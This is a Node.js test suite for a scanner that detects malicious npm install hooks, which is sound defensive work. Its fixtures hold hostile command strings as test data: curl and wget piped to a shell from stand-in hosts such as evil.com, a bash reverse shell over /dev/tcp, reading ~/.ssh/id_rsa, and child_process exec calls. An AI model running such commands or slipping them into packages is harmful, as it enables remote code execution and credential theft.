'use strict';

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const { checkScripts } = require('../src/scanners/lifecycle-scripts');

describe('lifecycle-scripts scanner', () => {
  it('flags curl piped to bash in postinstall', () => {
    const scripts = { postinstall: 'curl http://evil.com/payload.sh | bash' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.equal(hits[0].hook, 'postinstall');
    assert.equal(hits[0].severity, 'critical');
    assert.ok(hits[0].triggers.includes('pipe-to-shell'));
  });

  it('flags wget piped to sh in preinstall', () => {
    const scripts = { preinstall: 'wget https://x.com/s.sh | sh' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.equal(hits[0].severity, 'critical');
    assert.ok(hits[0].triggers.includes('pipe-to-shell'));
  });

  it('flags node -e eval in install', () => {
    const scripts = { install: "node -e 'require(\"child_process\").exec(\"whoami\")'" };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.includes('node-eval'));
    assert.ok(hits[0].triggers.includes('child_process-import'));
  });

  it('flags base64 decoding', () => {
    const scripts = { postinstall: 'Buffer.from("aGVsbG8=", "base64")' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.includes('base64-decode'));
  });

  it('flags IP address URLs', () => {
    const scripts = { postinstall: 'curl http://192.168.1.1/payload' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.includes('ip-address-url'));
  });

  it('flags credential file access', () => {
    const scripts = { postinstall: 'cat ~/.ssh/id_rsa' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.includes('credential-file-access'));
  });

  it('flags reverse shell patterns', () => {
    const scripts = { postinstall: 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.equal(hits[0].severity, 'critical');
    assert.ok(hits[0].triggers.includes('reverse-shell'));
  });

  it('ignores safe scripts', () => {
    const scripts = {
      postinstall: 'node scripts/build.js',
      preinstall: 'npx check-engine',
      prepare: 'husky install',
    };
    const hits = checkScripts(scripts, 'safe-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 0);
  });

  it('ignores non-lifecycle scripts', () => {
    const scripts = {
      start: 'curl http://evil.com | bash',
      test: 'node -e "process.exit(1)"',
      build: 'eval some-thing',
    };
    const hits = checkScripts(scripts, 'pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 0);
  });

  it('truncates long scripts in output', () => {
    const longScript = 'curl http://evil.com/x | bash ' + 'A'.repeat(600);
    const scripts = { postinstall: longScript };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].script.length <= 500);
  });

  it('detects multiple triggers on a single hook', () => {
    const scripts = { postinstall: 'node -e \'require("child_process").exec("curl http://192.168.1.1/x | bash")\'' };
    const hits = checkScripts(scripts, 'bad-pkg', 'test-proj', '/tmp');
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.length >= 3);
  });
});

describe('lifecycle-scripts referenced files and robustness', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { scan } = require('../src/scanners/lifecycle-scripts');
  let tmp;
  const { beforeEach, afterEach } = require('node:test');
  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-lc-')); });
  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });

  function pkg(dir, json, files = {}) {
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(json));
    for (const [f, c] of Object.entries(files)) {
      fs.mkdirSync(path.dirname(path.join(dir, f)), { recursive: true });
      fs.writeFileSync(path.join(dir, f), c);
    }
  }

  it('flags a known worm payload filename (Shai-Hulud setup_bun.js)', () => {
    pkg(tmp, { scripts: { preinstall: 'node setup_bun.js' } }, { 'setup_bun.js': 'console.log(1)' });
    const hits = checkScripts({ preinstall: 'node setup_bun.js' }, 'x', 'p', tmp);
    assert.equal(hits.length, 1);
    assert.equal(hits[0].severity, 'critical');
    assert.ok(hits[0].triggers.includes('known-worm-filename'));
  });

  it('inspects the file a hook runs, not just the script string', () => {
    const hits = (() => {
      pkg(tmp, {}, { 'scripts/install.js': 'require("child_process").execSync("curl -s http://evil.example/x | sh")' });
      return checkScripts({ postinstall: 'node scripts/install.js' }, 'x', 'p', tmp);
    })();
    assert.equal(hits.length, 1);
    assert.ok(hits[0].triggers.includes('pipe-to-shell'));
    assert.deepEqual(hits[0].script_files, ['scripts/install.js']);
  });

  it('does not flag a typical native-build installer', () => {
    pkg(tmp, {}, { 'install.js': 'const { execSync } = require("child_process");\nconst https = require("https");\nexecSync("node-gyp rebuild", { env: process.env });' });
    assert.equal(checkScripts({ postinstall: 'node install.js' }, 'x', 'p', tmp).length, 0);
  });

  it('ignores referenced files outside the package directory', () => {
    fs.writeFileSync(path.join(tmp, 'outside.js'), 'curl http://1.2.3.4/x | bash');
    const inner = path.join(tmp, 'inner');
    fs.mkdirSync(inner);
    assert.equal(checkScripts({ postinstall: 'node ../outside.js' }, 'x', 'p', inner).length, 0);
  });

  it('stays fast on hostile long scripts', () => {
    const start = Date.now();
    checkScripts({ postinstall: 'nc '.repeat(40000) }, 'x', 'p', tmp);
    assert.ok(Date.now() - start < 500, `took ${Date.now() - start}ms`);
  });

  it('scans scoped, nested, and global node_modules', () => {
    const proj = path.join(tmp, 'proj');
    const evil = { scripts: { postinstall: 'curl http://evil.example/x | bash' } };
    pkg(path.join(proj, 'node_modules', '@scope', 'a'), evil);
    pkg(path.join(proj, 'node_modules', 'b', 'node_modules', 'c'), evil);
    pkg(path.join(tmp, 'global', 'lib', 'node_modules', 'g'), evil);
    const r = scan({ npmGlobalDirs: [path.join(tmp, 'global')] }, {}, [{ project: 'proj', project_path: proj }]);
    assert.deepEqual(r.findings.map(f => f.path.slice(tmp.length)).sort(), [
      path.join('/global', 'lib', 'node_modules', 'g'),
      path.join('/proj', 'node_modules', '@scope', 'a'),
      path.join('/proj', 'node_modules', 'b', 'node_modules', 'c'),
    ].sort());
  });
});
